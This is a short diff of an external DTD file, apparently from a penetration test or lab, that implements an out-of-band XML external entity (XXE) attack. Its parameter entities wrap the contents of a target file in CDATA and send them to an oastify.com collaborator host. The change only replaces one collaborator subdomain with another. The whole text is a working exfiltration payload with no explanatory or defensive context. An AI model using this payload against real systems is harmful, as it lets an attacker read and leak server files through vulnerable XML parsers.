@@ -2,5 +2,5 @@
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % conclude "%start;%file;%end;">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://ozr8f3oam4scukooysojpr94xv3nref3.oastify.com/aaa?content=%conclude;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://dct406nmmssrjyua9cmhfsdgh7nybozd.oastify.com/aaa?content=%conclude;'>">
 %all;
